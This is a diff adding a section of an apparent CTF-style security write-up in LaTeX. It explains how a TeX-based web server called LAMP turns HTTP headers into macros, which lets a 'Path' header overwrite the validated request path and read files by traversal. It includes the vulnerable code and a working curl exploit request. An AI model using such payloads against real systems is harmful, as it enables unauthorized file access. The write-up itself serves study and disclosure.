@@ -1,0 +1,267 @@
+% ============================================================
+% 03 -- PATH HEADER OVERWRITE
+% ============================================================
+
+\section{Path Header Overwrite}
+\label{sec:path-header}
+
+The first useful primitive came from a surprisingly small naming
+collision.
+
+LAMP parsed the requested path from the HTTP request line and stored it
+inside the TeX macro \code{\textbackslash httpPath}.
+
+The relevant code was:
+
+\begin{lstlisting}
+\newcommand{\httpParseLine}{
+  \readln{\httpLine}
+  \StrCut[1]{\httpLine}{ }{\httpMethod}{\httpLine}
+  \StrCut[1]{\httpLine}{ }{\httpPath}{\httpVersion}
+  \StrCut[1]{\httpPath}{?}{\httpPath}{\httpQuery}
+
+  \xdef\httpMethod#1{\httpMethod}
+  \xdef\httpPath#1{\httpPath}
+  \xdef\httpVersion#1{\httpVersion}
+}
+\end{lstlisting}
+
+So for a normal request such as:
+
+\begin{lstlisting}
+GET / HTTP/1.1
+\end{lstlisting}
+
+the application eventually ended up with roughly:
+
+\begin{lstlisting}
+\httpPath{} -> /
+\end{lstlisting}
+
+So far, nothing particularly exciting.
+
+
+% ------------------------------------------------------------
+% 3.1
+% ------------------------------------------------------------
+
+\subsection{Headers Became TeX Macros}
+
+The interesting part appeared immediately afterwards.
+
+LAMP parsed every HTTP header and dynamically created a TeX control
+sequence from its name:
+
+\begin{lstlisting}
+\newcommand{\httpParseHeader}{
+  \loop
+  \readln{\header}
+
+  \unless\ifx\header\empty{
+
+      \StrCut[1]{\header}{:}{\name}{\value}
+
+      ...
+
+      \edef\name{\httpTransformHeaderName{\name}}
+
+      \expandafter\xdef
+        \csname http\name\endcsname
+        #1{\value}
+
+    }
+
+  \repeat
+}
+\end{lstlisting}
+
+For example:
+
+\begin{lstlisting}
+Cookie: Session=abc
+\end{lstlisting}
+
+created a macro named approximately:
+
+\begin{lstlisting}
+\httpCookie{}
+\end{lstlisting}
+
+This was intended as a convenient way of exposing request headers to the
+rest of the application.
+
+Unfortunately, header names shared the same namespace as LAMP's internal
+request state.
+
+
+% ------------------------------------------------------------
+% 3.2
+% ------------------------------------------------------------
+
+\subsection{The Collision}
+
+One internal variable was already named:
+
+\begin{lstlisting}
+\httpPath
+\end{lstlisting}
+
+The corresponding HTTP header name was therefore fairly obvious:
+
+\begin{lstlisting}
+Path:
+\end{lstlisting}
+
+After LAMP transformed the header name and constructed the dynamic macro,
+the following header:
+
+\begin{lstlisting}
+Path: /something
+\end{lstlisting}
+
+created:
+
+\begin{lstlisting}
+\httpPath{} -> /something
+\end{lstlisting}
+
+That replaced the path originally parsed from the request line.
+
+\begin{findingbox}
+The request path and HTTP headers were stored in the same dynamically
+constructed TeX namespace.
+
+As a result, a client-controlled \code{Path} header could overwrite the
+internal \code{\textbackslash httpPath} variable.
+\end{findingbox}
+
+
+% ------------------------------------------------------------
+% 3.3
+% ------------------------------------------------------------
+
+\subsection{Why Validation Did Not Save It}
+
+This became particularly useful because path validation happened before
+the malicious header replaced the path.
+
+Conceptually, the request flow looked like this:
+
+\begin{lstlisting}
+GET / HTTP/1.1
+
+        |
+        v
+
+validate "/"
+
+        |
+        v
+
+Path: /../../etc/hostname
+
+        |
+        v
+
+\httpPath = /../../etc/hostname
+\end{lstlisting}
+
+The request itself therefore used a completely legitimate route:
+
+\begin{lstlisting}
+GET /
+\end{lstlisting}
+
+Only afterwards did the \code{Path} header replace the value used by the
+TeX application.
+
+The validation applied to one value.
+
+The application later consumed another.
+
+
+% ------------------------------------------------------------
+% 3.4
+% ------------------------------------------------------------
+
+\subsection{Turning It Into a File Read}
+
+The static-file handler constructed paths using:
+
+\begin{lstlisting}
+\httpStatic\httpPath{}
+\end{lstlisting}
+
+where the static root was configured as:
+
+\begin{lstlisting}
+/srv/www/
+\end{lstlisting}
+
+With a traversal value in \code{\textbackslash httpPath}, this could
+resolve outside the intended static directory.
+
+The file-serving code then used the resulting path directly:
+
+\begin{lstlisting}
+\immediate\write18{
+  cat "`cat path.tex`"
+}
+\end{lstlisting}
+
+A minimal request therefore became:
+
+\begin{lstlisting}
+curl -g -6 --noproxy '*' \
+  --path-as-is \
+  -H 'Path: /../../etc/hostname' \
+  'http://[TARGET]:1337/'
+\end{lstlisting}
+
+The request line still targeted the valid route \code{/}.
+
+The \code{Path} header then replaced the internal path after parsing and
+allowed the service to return files outside the intended web root.
+
+
+% ------------------------------------------------------------
+% 3.5
+% ------------------------------------------------------------
+
+\subsection{What This Gave Us}
+
+At this point, the primitive was already useful:
+
+\begin{center}
+  \displayfont\large\bfseries
+  attacker-controlled file retrieval inside the LAMP container
+\end{center}
+
+It could be used to retrieve files reachable by the service process,
+including files created later during exploitation.
+
+That last detail became especially important.
+
+Once we found a way to execute a shell command and redirect its output
+into a file, the same \code{Path} header bug gave us a convenient way to
+retrieve the result over HTTP.
+
+The exploit chain therefore gained its first reusable building block:
+
+\begin{center}
+  \displayfont
+  \code{Path:}
+  $\longrightarrow$
+  overwrite \code{\textbackslash httpPath}
+  $\longrightarrow$
+  traverse filesystem
+  $\longrightarrow$
+  retrieve file
+\end{center}
+
+The next step was finding something more powerful than a file read:
+
+\begin{center}
+  \displayfont\large\bfseries
+  making stored database content become executable TeX.
+\end{center}
